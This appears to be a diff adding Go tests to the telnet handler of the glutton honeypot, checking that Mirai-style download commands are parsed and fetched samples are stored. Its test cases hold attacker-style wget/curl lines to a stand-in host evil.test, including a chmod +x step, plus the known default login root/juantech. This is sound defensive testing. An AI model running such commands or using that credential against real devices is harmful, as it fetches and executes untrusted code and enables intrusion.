@@ -3,14 +3,40 @@ package tcp
 import (
 	"bufio"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"io"
 	"net"
+	"net/http"
+	"net/http/httptest"
+	"os"
+	"path/filepath"
 	"testing"
 	"time"
 
 	"github.com/mushorg/glutton/connection"
 	"github.com/stretchr/testify/require"
 )
+
+func TestTelnetDownloadURL(t *testing.T) {
+	cases := []struct {
+		cmd string
+		url string
+		ok  bool
+	}{
+		{"wget http://evil.test/a\r\n", "http://evil.test/a", true},
+		{"wget -q -O- https://evil.test/b; chmod +x b\r\n", "https://evil.test/b", true},
+		{"curl http://evil.test/c\r\n", "http://evil.test/c", true},
+		{"/bin/busybox wget http://evil.test/d\x00\r\n", "http://evil.test/d", true},
+		{"ls -la\r\n", "", false},
+		{"wget missing-url\r\n", "", false},
+	}
+	for _, tc := range cases {
+		url, ok := telnetDownloadURL(tc.cmd)
+		require.Equal(t, tc.ok, ok, tc.cmd)
+		require.Equal(t, tc.url, url, tc.cmd)
+	}
+}
 
 func TestStripTelnetIAC(t *testing.T) {
 	iac := []byte{0xff, 0xfd, 0x18, 0xff, 0xfd, 0x20, 0xff, 0xfd, 0x23, 0xff, 0xfd, 0x27}
@@ -133,6 +159,90 @@ func TestHandleTelnetMiraiFlow(t *testing.T) {
 	}
 	require.Equal(t, want, events)
 	require.Equal(t, connection.EndClientClose, produced.endReason)
+	require.Contains(t, logger.infos, "telnet login")
+	require.True(t, logger.hasAttr("username", "root"))
+	require.True(t, logger.hasAttr("password", "juantech"))
+	require.True(t, logger.hasAttr("handler", "telnet"))
+}
+
+func TestHandleTelnetFetchesWgetSample(t *testing.T) {
+	payload := []byte("mirai-sample-bytes")
+	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		_, _ = w.Write(payload)
+	}))
+	defer ts.Close()
+
+	samplesDir := t.TempDir()
+	prevWD, err := os.Getwd()
+	require.NoError(t, err)
+	require.NoError(t, os.Chdir(samplesDir))
+	t.Cleanup(func() { _ = os.Chdir(prevWD) })
+
+	client, serverConn := net.Pipe()
+	defer client.Close()
+
+	hp := newFakeHoneypot()
+	logger := &recordingLogger{}
+	server := newTelnetServer(serverConn)
+	server.client = ts.Client()
+
+	done := make(chan error, 1)
+	go func() {
+		done <- handleTelnet(context.Background(), server, connection.Metadata{TargetPort: 23}, logger, hp)
+	}()
+
+	reader := bufio.NewReader(client)
+	expect := func(want string) {
+		t.Helper()
+		require.NoError(t, client.SetReadDeadline(time.Now().Add(2*time.Second)))
+		buf := make([]byte, len(want))
+		_, err := io.ReadFull(reader, buf)
+		require.NoError(t, err)
+		require.Equal(t, want, string(buf))
+	}
+	send := func(data string) {
+		t.Helper()
+		require.NoError(t, client.SetWriteDeadline(time.Now().Add(2*time.Second)))
+		_, err := client.Write([]byte(data))
+		require.NoError(t, err)
+	}
+
+	negotiate := "\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27"
+	expect(negotiate)
+	expect("Username: ")
+	send("bot\r\n")
+	expect("Password: ")
+	send("pass\r\n")
+	expect("welcome\r\n> ")
+	send("curl " + ts.URL + "/bin\r\n")
+	expect("> ")
+	require.NoError(t, client.Close())
+
+	select {
+	case err := <-done:
+		require.NoError(t, err)
+	case <-time.After(3 * time.Second):
+		t.Fatal("handler did not finish")
+	}
+
+	produced := waitProduced(t, hp)
+	events, ok := produced.decoded.([]parsedTelnet)
+	require.True(t, ok)
+
+	var found bool
+	sum := sha256.Sum256(payload)
+	wantHash := hex.EncodeToString(sum[:])
+	for _, ev := range events {
+		if ev.Direction == "read" && ev.Command == "curl" {
+			require.Equal(t, ts.URL+"/bin", ev.Path)
+			require.Equal(t, wantHash, ev.PayloadHash)
+			found = true
+		}
+	}
+	require.True(t, found, "expected curl read frame with path and payload_hash")
+	require.Contains(t, logger.infos, "telnet login")
+	require.Contains(t, logger.infos, "New sample fetched")
+	require.FileExists(t, filepath.Join("samples", wantHash))
 }
 
 func TestHandleTelnetClientDisconnect(t *testing.T) {
